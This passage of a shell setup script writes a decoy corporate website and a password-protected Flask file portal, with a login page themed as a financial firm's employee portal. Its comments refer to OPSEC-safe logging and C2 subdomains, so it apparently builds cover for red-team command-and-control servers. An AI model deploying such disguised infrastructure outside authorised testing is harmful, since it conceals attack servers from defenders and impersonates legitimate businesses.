    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Pricing | Plexura</title>
    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <header class="header">
        <nav class="nav">
            <a href="/" class="logo">Plexura<span>MS</span></a>
            <div class="nav-links">
                <a href="/solutions">Solutions</a>
                <a href="/pricing">Pricing</a>
                <a href="/contact">Contact</a>
            </div>
        </nav>
    </header>

    <section class="hero hero-sm">
        <h1>Simple, Transparent Pricing</h1>
        <p>Plans that scale with your business. No hidden fees.</p>
    </section>

    <section class="section">
        <div class="grid">
            <div class="card text-center">
                <h3>Starter</h3>
                <p class="text-muted">For small teams getting started</p>
                <div class="price">Custom</div>
                <p class="price-sub">Based on usage</p>
                <ul style="text-align: left;">
                    <li>Up to 5 data sources</li>
                    <li>Standard replication</li>
                    <li>Community support</li>
                    <li>Basic monitoring</li>
                </ul>
                <div class="mt-20"><a href="/contact" class="btn btn-outline">Get Started</a></div>
            </div>
            <div class="card card-highlight text-center">
                <h3>Business</h3>
                <p class="text-muted">For growing organizations</p>
                <div class="price">Custom</div>
                <p class="price-sub">Volume-based pricing</p>
                <ul style="text-align: left;">
                    <li>Unlimited data sources</li>
                    <li>Real-time replication</li>
                    <li>Priority support</li>
                    <li>Advanced analytics</li>
                    <li>SSO & RBAC</li>
                </ul>
                <div class="mt-20"><a href="/contact" class="btn">Contact Sales</a></div>
            </div>
            <div class="card text-center">
                <h3>Enterprise</h3>
                <p class="text-muted">For mission-critical workloads</p>
                <div class="price">Custom</div>
                <p class="price-sub">Annual agreement</p>
                <ul style="text-align: left;">
                    <li>Everything in Business</li>
                    <li>Dedicated infrastructure</li>
                    <li>24/7 premium support</li>
                    <li>Custom SLAs</li>
                    <li>On-premises deployment</li>
                </ul>
                <div class="mt-20"><a href="/contact" class="btn btn-outline">Talk to Sales</a></div>
            </div>
        </div>
    </section>

    <section style="background: #fff; padding: 60px 20px;">
        <div style="max-width: 700px; margin: 0 auto; text-align: center;">
            <h2 style="margin-bottom: 20px;">Need a custom plan?</h2>
            <p class="text-muted">We work with teams of all sizes to build pricing that fits. Reach out and we will put together a tailored proposal.</p>
            <div class="mt-20"><a href="/contact" class="btn">Contact Us</a></div>
        </div>
    </section>

    <footer class="footer">
        <div class="footer-inner">
            <div class="footer-col">
                <a href="/" class="logo" style="font-size: 1.3em;">Plexura<span>MS</span></a>
                <p style="margin-top: 10px;">Managed cloud infrastructure<br>for modern enterprises.</p>
            </div>
            <div class="footer-col">
                <h4>Product</h4>
                <a href="/solutions">Solutions</a>
                <a href="/pricing">Pricing</a>
                <a href="#">Changelog</a>
            </div>
            <div class="footer-col">
                <h4>Company</h4>
                <a href="#">About</a>
                <a href="#">Careers</a>
                <a href="/contact">Contact</a>
            </div>
            <div class="footer-col">
                <h4>Legal</h4>
                <a href="#">Privacy Policy</a>
                <a href="#">Terms of Service</a>
            </div>
        </div>
        <div class="footer-bottom">
            <p>&copy; 2024 Plexura Managed Solutions. All rights reserved.</p>
        </div>
    </footer>
</body>
</html>
HTMLEOF

# Contact page
cat > /var/www/html/contact.html << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Contact | Plexura</title>
    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <header class="header">
        <nav class="nav">
            <a href="/" class="logo">Plexura<span>MS</span></a>
            <div class="nav-links">
                <a href="/solutions">Solutions</a>
                <a href="/pricing">Pricing</a>
                <a href="/contact">Contact</a>
            </div>
        </nav>
    </header>

    <section class="hero hero-sm">
        <h1>Get in Touch</h1>
        <p>Talk to our team about your data infrastructure needs.</p>
    </section>

    <section class="section">
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 60px; max-width: 900px; margin: 0 auto;">
            <div>
                <h2 style="margin-bottom: 30px; font-size: 1.5em;">Contact Sales</h2>
                <form onsubmit="event.preventDefault(); this.innerHTML='<p style=padding:40px;text-align:center;color:#666;>Thanks for reaching out. Our team will be in touch within one business day.</p>'; return false;">
                    <div class="form-group">
                        <label>Full Name</label>
                        <input type="text" placeholder="Jane Smith" required>
                    </div>
                    <div class="form-group">
                        <label>Work Email</label>
                        <input type="email" placeholder="jane@company.com" required>
                    </div>
                    <div class="form-group">
                        <label>Company</label>
                        <input type="text" placeholder="Acme Inc.">
                    </div>
                    <div class="form-group">
                        <label>What are you looking for?</label>
                        <select>
                            <option>Data Replication</option>
                            <option>Stream Processing</option>
                            <option>Managed ETL</option>
                            <option>Enterprise Plan</option>
                            <option>Other</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Message</label>
                        <textarea rows="4" placeholder="Tell us about your use case..."></textarea>
                    </div>
                    <button type="submit" class="btn" style="border: none; cursor: pointer; font-size: 1em;">Send Message</button>
                </form>
            </div>
            <div style="padding-top: 60px;">
                <div style="margin-bottom: 30px;">
                    <h3 style="margin-bottom: 8px; color: #1a1a2e;">Sales</h3>
                    <p class="text-muted">sales@example-solutions.com</p>
                </div>
                <div style="margin-bottom: 30px;">
                    <h3 style="margin-bottom: 8px; color: #1a1a2e;">Support</h3>
                    <p class="text-muted">support@example-solutions.com</p>
                </div>
                <div style="margin-bottom: 30px;">
                    <h3 style="margin-bottom: 8px; color: #1a1a2e;">Office</h3>
                    <p class="text-muted">71 Queen Victoria Street, 3rd Floor<br>London, EC4V 4AY</p>
                </div>
                <div>
                    <h3 style="margin-bottom: 8px; color: #1a1a2e;">Response Time</h3>
                    <p class="text-muted">We typically respond within one business day.</p>
                </div>
            </div>
        </div>
    </section>

    <footer class="footer">
        <div class="footer-inner">
            <div class="footer-col">
                <a href="/" class="logo" style="font-size: 1.3em;">Plexura<span>MS</span></a>
                <p style="margin-top: 10px;">Managed cloud infrastructure<br>for modern enterprises.</p>
            </div>
            <div class="footer-col">
                <h4>Product</h4>
                <a href="/solutions">Solutions</a>
                <a href="/pricing">Pricing</a>
                <a href="#">Changelog</a>
            </div>
            <div class="footer-col">
                <h4>Company</h4>
                <a href="#">About</a>
                <a href="#">Careers</a>
                <a href="/contact">Contact</a>
            </div>
            <div class="footer-col">
                <h4>Legal</h4>
                <a href="#">Privacy Policy</a>
                <a href="#">Terms of Service</a>
            </div>
        </div>
        <div class="footer-bottom">
            <p>&copy; 2024 Plexura Managed Solutions. All rights reserved.</p>
        </div>
    </footer>
</body>
</html>
HTMLEOF

# Custom error pages
cat > /var/www/html/404.html << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Page Not Found | Plexura</title>
    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <header class="header">
        <nav class="nav">
            <a href="/" class="logo">Plexura<span>MS</span></a>
            <div class="nav-links">
                <a href="/solutions">Solutions</a>
                <a href="/pricing">Pricing</a>
                <a href="/contact">Contact</a>
            </div>
        </nav>
    </header>
    <section class="hero hero-sm">
        <h1 style="font-size: 5em; margin-bottom: 10px;">404</h1>
        <p>The page you are looking for does not exist.</p>
        <div class="mt-20"><a href="/" class="btn">Back to Home</a></div>
    </section>
    <footer class="footer">
        <div class="footer-bottom" style="border: none; margin: 0; padding: 0;">
            <p>&copy; 2024 Plexura Managed Solutions. All rights reserved.</p>
        </div>
    </footer>
</body>
</html>
HTMLEOF

cat > /var/www/html/50x.html << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Service Unavailable | Plexura</title>
    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <header class="header">
        <nav class="nav">
            <a href="/" class="logo">Plexura<span>MS</span></a>
            <div class="nav-links">
                <a href="/solutions">Solutions</a>
                <a href="/pricing">Pricing</a>
                <a href="/contact">Contact</a>
            </div>
        </nav>
    </header>
    <section class="hero hero-sm">
        <h1>Service Temporarily Unavailable</h1>
        <p>We are performing scheduled maintenance. Please try again later.</p>
    </section>
    <footer class="footer">
        <div class="footer-bottom" style="border: none; margin: 0; padding: 0;">
            <p>&copy; 2024 Plexura Managed Solutions. All rights reserved.</p>
        </div>
    </footer>
</body>
</html>
HTMLEOF

# robots.txt
cat > /var/www/html/robots.txt << 'ROBOTSEOF'
User-agent: *
Disallow: /
ROBOTSEOF

echo "Technology decoy website created (Plexura Managed Solutions)"

fi # End decoy theme conditional

echo "Decoy website created"
write_step_status 3 "Decoy Website" "ok"

# =============================================================================
# 3b. File Portal (Optional)
# =============================================================================
if [ "$ENABLE_FILE_PORTAL" = "true" ]; then
    echo "[3b] Setting up file portal..."

    # Validate password is set
    if [ -z "$PORTAL_PASSWORD" ]; then
        echo "ERROR: portal_password must be set when enable_file_portal is true"
        write_step_status 3 "File Portal" "failed" "portal_password not set"
        exit 1
    fi

    # Install dependencies (pinned versions)
    pip3 install 'flask==3.1.*' 'bcrypt==4.2.*' 'gunicorn==23.*'

    # Create directories
    mkdir -p /opt/portal
    mkdir -p /var/www/uploads/upload
    chown -R www-data:www-data /var/www/uploads
    mkdir -p /etc/portal

    # Generate bcrypt hash and write credentials (password via stdin to avoid shell injection)
    PORTAL_HASH=$(echo -n "$PORTAL_PASSWORD" | python3 -c "import sys, bcrypt; pw=sys.stdin.buffer.read(); print(bcrypt.hashpw(pw, bcrypt.gensalt()).decode())")
    cat > /etc/portal/credentials << CREDEOF
$${PORTAL_USERNAME}
$${PORTAL_HASH}
CREDEOF
    chmod 600 /etc/portal/credentials
    chown www-data:www-data /etc/portal/credentials

    # Write Flask application
    cat > /opt/portal/app.py << 'APPEOF'
import os
import re
import time
import json
import secrets
import shutil
import logging
from functools import wraps
from pathlib import Path

import bcrypt
from flask import (Flask, Blueprint, request, redirect, make_response,
                   jsonify, send_file, render_template_string)
from werkzeug.utils import secure_filename

# =============================================================================
# Configuration
# =============================================================================
UPLOAD_DIR = '/var/www/uploads'
CREDENTIALS_FILE = os.environ.get('PORTAL_CONFIG', '/etc/portal/credentials')
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
MAX_PASSWORD_LENGTH = 128
MAX_SESSIONS = 50
STORAGE_CAP = 5 * 1024 * 1024 * 1024  # 5GB aggregate
MIN_FREE_DISK = 2 * 1024 * 1024 * 1024  # 2GB
SESSION_TIMEOUT = int(os.environ.get('PORTAL_SESSION_TIMEOUT', '30')) * 60  # minutes -> seconds
FOLDER_REGEX = re.compile(r'^[a-zA-Z0-9_-]+$')

# =============================================================================
# Auth logging (tmpfs — OPSEC safe)
# =============================================================================
auth_logger = logging.getLogger('portal_auth')
auth_handler = logging.FileHandler('/dev/shm/portal-auth.log')
auth_handler.setFormatter(logging.Formatter('%(asctime)s PORTAL_AUTH_FAIL ip=%(message)s'))
auth_logger.addHandler(auth_handler)
auth_logger.setLevel(logging.WARNING)

# =============================================================================
# Credentials
# =============================================================================
with open(CREDENTIALS_FILE) as f:
    lines = f.read().strip().split('\n')
    STORED_USERNAME = lines[0]
    STORED_HASH = lines[1].encode()

DUMMY_HASH = bcrypt.hashpw(b'dummy', bcrypt.gensalt())

# =============================================================================
# Session store
# =============================================================================
sessions = {}  # session_id -> {"issued_at": float, "csrf_token": str}


def purge_expired():
    """Lazy purge of expired sessions on every request."""
    now = time.time()
    expired = [sid for sid, data in sessions.items()
               if now - data['issued_at'] > SESSION_TIMEOUT]
    for sid in expired:
        del sessions[sid]


def get_real_ip():
    """Get real client IP from X-Real-IP header (set by nginx to $remote_addr)."""
    return request.environ.get('HTTP_X_REAL_IP', request.remote_addr)


def get_dir_size(path):
    """Get total size of directory in bytes."""
    total = 0
    for dirpath, dirnames, filenames in os.walk(path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            if os.path.isfile(fp):
                total += os.path.getsize(fp)
    return total


def safe_path(folder, filename=None):
    """Validate and return a safe filesystem path within UPLOAD_DIR."""
    if not FOLDER_REGEX.match(folder):
        return None
    if filename:
        filename = secure_filename(filename)
        if not filename:
            return None
        target = os.path.realpath(os.path.join(UPLOAD_DIR, folder, filename))
    else:
        target = os.path.realpath(os.path.join(UPLOAD_DIR, folder))
    if not target.startswith(os.path.realpath(UPLOAD_DIR)):
        return None
    return target


def human_size(nbytes):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if nbytes < 1024:
            return f"{nbytes:.1f} {unit}"
        nbytes /= 1024
    return f"{nbytes:.1f} TB"


# =============================================================================
# Flask App
# =============================================================================
app = Flask(__name__)
app.debug = False
app.config['PROPAGATE_EXCEPTIONS'] = False
app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE
app.config['SESSION_COOKIE_DOMAIN'] = False  # Prevent cookie leaking to C2 subdomains


@app.after_request
def add_security_headers(response):
    """Add security headers to all portal responses."""
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Referrer-Policy'] = 'no-referrer'
    response.headers['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=()'
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; form-action 'self'"
    return response

portal_bp = Blueprint('portal', __name__)


@portal_bp.before_request
def require_auth():
    """Enforce auth on all /portal/* routes. Login routes are public."""
    purge_expired()
    if request.endpoint in ('portal.login_get', 'portal.login_post'):
        return
    session_id = request.cookies.get('session_id')
    if not session_id or session_id not in sessions:
        return redirect('/login')
    if time.time() - sessions[session_id]['issued_at'] > SESSION_TIMEOUT:
        del sessions[session_id]
        return redirect('/login')


def check_csrf(f):
    """CSRF check decorator for mutating endpoints."""
    @wraps(f)
    def decorated(*args, **kwargs):
        session_id = request.cookies.get('session_id')
        if not session_id or session_id not in sessions:
            return jsonify({"error": "Not authenticated"}), 401
        expected = sessions[session_id].get('csrf_token', '')
        provided = request.headers.get('X-CSRF-Token', '')
        if not expected or not provided or expected != provided:
            return jsonify({"error": "CSRF token invalid"}), 403
        return f(*args, **kwargs)
    return decorated


# --- Auth routes ---

@portal_bp.route('/login', methods=['GET'])
def login_get():
    error = request.args.get('error', '')
    return render_template_string(LOGIN_TEMPLATE, error=error)


@portal_bp.route('/login', methods=['POST'])
def login_post():
    username = request.form.get('username', '')
    password = request.form.get('password', '')

    # Password length check (DoS prevention — before bcrypt)
    if len(password) > MAX_PASSWORD_LENGTH:
        auth_logger.warning(get_real_ip())
        return redirect('/login?error=1')

    # Timing-safe auth
    if username != STORED_USERNAME:
        bcrypt.checkpw(password.encode(), DUMMY_HASH)
        auth_logger.warning(get_real_ip())
        return redirect('/login?error=1')
    if not bcrypt.checkpw(password.encode(), STORED_HASH):
        auth_logger.warning(get_real_ip())
        return redirect('/login?error=1')

    # Check session limit
    if len(sessions) >= MAX_SESSIONS:
        return "Service temporarily unavailable", 503

    # Create session
    session_id = secrets.token_hex(32)
    csrf_token = secrets.token_hex(32)
    sessions[session_id] = {'issued_at': time.time(), 'csrf_token': csrf_token}

    resp = make_response(redirect('/portal/'))
    resp.set_cookie('session_id', session_id,
                    httponly=True, secure=True, samesite='Strict',
                    max_age=SESSION_TIMEOUT)
    return resp


@portal_bp.route('/portal/logout')
def logout():
    session_id = request.cookies.get('session_id')
    if session_id and session_id in sessions:
        del sessions[session_id]
    resp = make_response(redirect('/login'))
    resp.delete_cookie('session_id')
    return resp


# --- File API routes ---

@portal_bp.route('/portal/')
def portal_index():
    session_id = request.cookies.get('session_id')
    csrf_token = sessions.get(session_id, {}).get('csrf_token', '')
    # Regenerate CSRF token on each full page load
    new_csrf = secrets.token_hex(32)
    sessions[session_id]['csrf_token'] = new_csrf
    return render_template_string(PORTAL_TEMPLATE, csrf_token=new_csrf)


@portal_bp.route('/portal/api/folders')
def list_folders():
    folders = []
    for name in sorted(os.listdir(UPLOAD_DIR)):
        full = os.path.join(UPLOAD_DIR, name)
        if os.path.isdir(full) and FOLDER_REGEX.match(name):
            folders.append(name)
    return jsonify({"folders": folders})


@portal_bp.route('/portal/api/folders', methods=['POST'])
@check_csrf
def create_folder():
    name = request.json.get('name', '').strip()
    if not name or not FOLDER_REGEX.match(name):
        return jsonify({"error": "Invalid folder name (alphanumeric, hyphens, underscores only)"}), 400
    path = safe_path(name)
    if not path:
        return jsonify({"error": "Invalid folder name"}), 400
    if os.path.exists(path):
        return jsonify({"error": "Folder already exists"}), 409
    os.makedirs(path)
    return jsonify({"ok": True, "folder": name}), 201


@portal_bp.route('/portal/api/files')
def list_files():
    folder = request.args.get('folder', 'upload')
    sort_by = request.args.get('sort', 'modified')
    path = safe_path(folder)
    if not path or not os.path.isdir(path):
        return jsonify({"error": "Folder not found"}), 404
    files = []
    for name in os.listdir(path):
        full = os.path.join(path, name)
        if os.path.isfile(full):
            stat = os.stat(full)
            files.append({
                "name": name,
                "size": stat.st_size,
                "size_human": human_size(stat.st_size),
                "modified": stat.st_mtime,
            })
    if sort_by == 'name':
        files.sort(key=lambda f: f['name'].lower())
    else:
        files.sort(key=lambda f: f['modified'], reverse=True)
    return jsonify({"folder": folder, "files": files})


@portal_bp.route('/portal/api/upload', methods=['POST'])
@check_csrf
def upload_file():
    folder = request.form.get('folder', 'upload')
    path = safe_path(folder)
    if not path or not os.path.isdir(path):
        return jsonify({"error": "Folder not found"}), 404

    # Disk space checks
    free = shutil.disk_usage(UPLOAD_DIR).free
    if free < MIN_FREE_DISK:
        return jsonify({"error": "Storage full"}), 507
    total_used = get_dir_size(UPLOAD_DIR)
    if total_used >= STORAGE_CAP:
        return jsonify({"error": "Storage cap reached"}), 507

    uploaded = []
    for key in request.files:
        f = request.files[key]
        if not f.filename:
            continue
        safe_name = secure_filename(f.filename)
        if not safe_name:
            continue
        dest = safe_path(folder, safe_name)
        if not dest:
            continue
        if os.path.exists(dest):
            return jsonify({"error": f"File already exists: {safe_name}"}), 409
        f.save(dest)
        uploaded.append(safe_name)

    return jsonify({"ok": True, "uploaded": uploaded}), 201


@portal_bp.route('/portal/api/download/<folder>/<filename>')
def download_file(folder, filename):
    path = safe_path(folder, filename)
    if not path or not os.path.isfile(path):
        return jsonify({"error": "File not found"}), 404
    return send_file(path, as_attachment=True, download_name=filename)


@portal_bp.route('/portal/api/files/<folder>/<filename>', methods=['DELETE'])
@check_csrf
def delete_file(folder, filename):
    path = safe_path(folder, filename)
    if not path or not os.path.isfile(path):
        return jsonify({"error": "File not found"}), 404
    os.remove(path)
    return jsonify({"ok": True})


# --- Shared clipboard ---

CLIPBOARD_FILE = os.path.join(UPLOAD_DIR, '.clipboard.json')

@portal_bp.route('/portal/api/clipboard')
def clipboard_get():
    if os.path.isfile(CLIPBOARD_FILE):
        with open(CLIPBOARD_FILE) as f:
            data = json.loads(f.read())
        return jsonify(data)
    return jsonify({"text": "", "updated_at": 0})


@portal_bp.route('/portal/api/clipboard', methods=['PUT'])
@check_csrf
def clipboard_put():
    text = (request.json or {}).get('text', '')
    if len(text) > 50000:
        return jsonify({"error": "Text too long (max 50KB)"}), 400
    data = {"text": text, "updated_at": time.time()}
    with open(CLIPBOARD_FILE, 'w') as f:
        f.write(json.dumps(data))
    return jsonify(data)


# --- Error handlers ---

@app.errorhandler(404)
def not_found(e):
    return render_template_string(ERROR_TEMPLATE, code=404), 404

@app.errorhandler(500)
def server_error(e):
    return render_template_string(ERROR_TEMPLATE, code=500), 500

@app.errorhandler(413)
def too_large(e):
    return jsonify({"error": "File too large (100MB max)"}), 413


# =============================================================================
# Templates (themed — injected by setup script based on DECOY_THEME)
# =============================================================================
LOGIN_TEMPLATE = '''PLACEHOLDER_LOGIN_TEMPLATE'''
PORTAL_TEMPLATE = '''PLACEHOLDER_PORTAL_TEMPLATE'''
ERROR_TEMPLATE = '''PLACEHOLDER_ERROR_TEMPLATE'''

# =============================================================================
# Register and run
# =============================================================================
app.register_blueprint(portal_bp)

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8443)
APPEOF

    # Inject themed templates based on DECOY_THEME
    if [ "$DECOY_THEME" = "meridian-financial" ]; then
        python3 << 'TEMPLATEEOF'
# Read app.py and replace placeholder template strings with Meridian Financial themed HTML
with open('/opt/portal/app.py') as f:
    content = f.read()

LOGIN_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Employee Portal | Meridian Financial Group</title>
    <style>
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Georgia, 'Times New Roman', Times, serif;
            background: #f5f4f0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: #0a1628;
            padding: 16px 0;
            border-bottom: 3px solid #8b7535;
        }
        .header-inner {
            max-width: 1000px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            align-items: center;
        }
        .logo {
            color: #c9b06b;
            font-size: 1.35em;
            font-weight: 400;
            letter-spacing: 1px;
            text-decoration: none;
        }
        .main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }
        .login-card {
            background: #fff;
            border: 1px solid #ddd;
            width: 100%;
            max-width: 400px;
            padding: 48px 40px 40px;
        }
        .login-card h1 {
            font-size: 1.5em;
            font-weight: 400;
            color: #0a1628;
            margin-bottom: 6px;
            letter-spacing: 0.5px;
        }
        .login-card .subtitle {
            color: #6b6b6b;
            font-size: 0.92em;
            margin-bottom: 32px;
            font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif;
        }
        .login-error {
            background: #fef2f2;
            border: 1px solid #f5c6cb;
            color: #842029;
            padding: 10px 14px;
            font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif;
            font-size: 0.85em;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif;
            font-size: 0.82em;
            color: #555;
            margin-bottom: 6px;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }
        .form-group input {
            width: 100%;
            padding: 11px 14px;
            border: 1px solid #ccc;
            font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif;
            font-size: 0.95em;
            color: #333;
            background: #fafaf8;
            transition: border-color 0.2s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #8b7535;
        }
        .btn-login {
            width: 100%;
            padding: 12px;
            background: #8b7535;
            color: #fff;
            border: none;
            font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif;
            font-size: 0.85em;
            letter-spacing: 1px;
            text-transform: uppercase;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn-login:hover {
            background: #a08940;
        }
        .footer {
            background: #0a1628;
            color: #5a6474;
            text-align: center;
            padding: 16px 20px;
            font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif;
            font-size: 0.78em;
        }
        @media (max-width: 480px) {
            .login-card { padding: 32px 24px 28px; }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-inner">
            <span class="logo">Meridian Financial Group</span>
        </div>
    </header>
    <main class="main">
        <div class="login-card">
            <h1>Meridian Financial Group</h1>
            <p class="subtitle">Employee Portal</p>
            {% if error %}<div class="login-error">Invalid credentials. Please try again.</div>{% endif %}
            <form method="POST" action="/login">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" required autocomplete="username" autofocus>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required autocomplete="current-password">
                </div>
                <button type="submit" class="btn-login">Sign In</button>
            </form>
        </div>
    </main>
    <footer class="footer">
        <p>&copy; 2024 Meridian Financial Group. All rights reserved.</p>
    </footer>
</body>
</html>"""

PORTAL_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token }}">
    <title>Document Portal | Meridian Financial Group</title>
    <style>
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif;
            background: #f5f4f0;
            color: #333;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .topbar {
            background: #0a1628;
            padding: 0 20px;
            height: 54px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 3px solid #8b7535;
        }
        .topbar-left {
            display: flex;
            align-items: center;
            gap: 18px;
        }
        .topbar-logo {
            color: #c9b06b;
            font-family: Georgia, 'Times New Roman', Times, serif;
            font-size: 1.15em;
            font-weight: 400;
            letter-spacing: 1px;
        }
        .topbar-title {
            color: #b0b8c4;
            font-size: 0.85em;
            letter-spacing: 0.5px;
        }
        .topbar-right a {
            color: #b0b8c4;
            text-decoration: none;
            font-size: 0.82em;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            transition: color 0.2s;
        }
        .topbar-right a:hover { color: #c9b06b; }
        .layout {
            flex: 1;
            display: flex;
            min-height: 0;
        }
        .sidebar {
            width: 230px;
            background: #fff;
            border-right: 1px solid #ddd;
            padding: 20px 0;
            flex-shrink: 0;
            overflow-y: auto;
        }
        .sidebar-header {
            padding: 0 16px 14px;
            font-size: 0.72em;
            letter-spacing: 1px;
            text-transform: uppercase;
            color: #999;
            border-bottom: 1px solid #eee;
            margin-bottom: 6px;
        }
        .folder-list {
            list-style: none;
        }
        .folder-list li {
            padding: 9px 16px;
            cursor: pointer;
            font-size: 0.9em;
            color: #444;
            transition: background 0.15s;
            border-left: 3px solid transparent;
        }
        .folder-list li:hover { background: #f5f4f0; }
        .folder-list li.active {
            background: #f5f4f0;
            color: #0a1628;
            font-weight: 600;
            border-left-color: #8b7535;
        }
        .folder-list li::before {
            content: "\1F4C1 ";
            margin-right: 6px;
        }
        .btn-new-folder {
            display: block;
            margin: 14px 16px 0;
            padding: 8px 0;
            background: none;
            border: 1px dashed #ccc;
            color: #888;
            font-size: 0.82em;
            cursor: pointer;
            text-align: center;
            transition: border-color 0.2s, color 0.2s;
        }
        .btn-new-folder:hover { border-color: #8b7535; color: #8b7535; }
        .content {
            flex: 1;
            padding: 24px 28px;
            min-width: 0;
            display: flex;
            flex-direction: column;
        }
        .content-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .content-header h2 {
            font-family: Georgia, 'Times New Roman', Times, serif;
            font-weight: 400;
            font-size: 1.3em;
            color: #0a1628;
        }
        .btn-browse {
            padding: 8px 20px;
            background: #8b7535;
            color: #fff;
            border: none;
            font-size: 0.82em;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-browse:hover { background: #a08940; }
        .file-input { display: none; }
        .upload-progress {
            display: none;
            margin-bottom: 16px;
        }
        .progress-bar-outer {
            background: #eee;
            height: 6px;
            width: 100%;
            overflow: hidden;
        }
        .progress-bar-inner {
            background: #8b7535;
            height: 100%;
            width: 0%;
            transition: width 0.2s;
        }
        .progress-text {
            font-size: 0.78em;
            color: #888;
            margin-top: 4px;
        }
        .file-table-wrap {
            flex: 1;
            position: relative;
            overflow: auto;
        }
        .file-table {
            width: 100%;
            border-collapse: collapse;
            background: #fff;
            border: 1px solid #ddd;
        }
        .file-table thead th {
            background: #0a1628;
            color: #c9b06b;
            padding: 10px 14px;
            text-align: left;
            font-size: 0.78em;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            font-weight: 600;
            cursor: pointer;
            user-select: none;
            white-space: nowrap;
        }
        .file-table thead th:hover { color: #fff; }
        .file-table thead th .sort-arrow { margin-left: 4px; font-size: 0.8em; }
        .file-table tbody td {
            padding: 10px 14px;
            border-bottom: 1px solid #eee;
            font-size: 0.88em;
        }
        .file-table tbody tr:hover { background: #fafaf8; }
        .file-name-link {
            color: #0a1628;
            text-decoration: none;
            font-weight: 500;
        }
        .file-name-link:hover { color: #8b7535; text-decoration: underline; }
        .btn-delete {
            background: none;
            border: 1px solid #d9534f;
            color: #d9534f;
            padding: 4px 10px;
            font-size: 0.78em;
            cursor: pointer;
            transition: background 0.2s, color 0.2s;
        }
        .btn-delete:hover { background: #d9534f; color: #fff; }
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #999;
            font-size: 0.95em;
        }
        .drop-overlay {
            display: none;
            position: absolute;
            inset: 0;
            background: rgba(10, 22, 40, 0.85);
            z-index: 100;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: #c9b06b;
            font-family: Georgia, 'Times New Roman', Times, serif;
            font-size: 1.3em;
            pointer-events: none;
        }
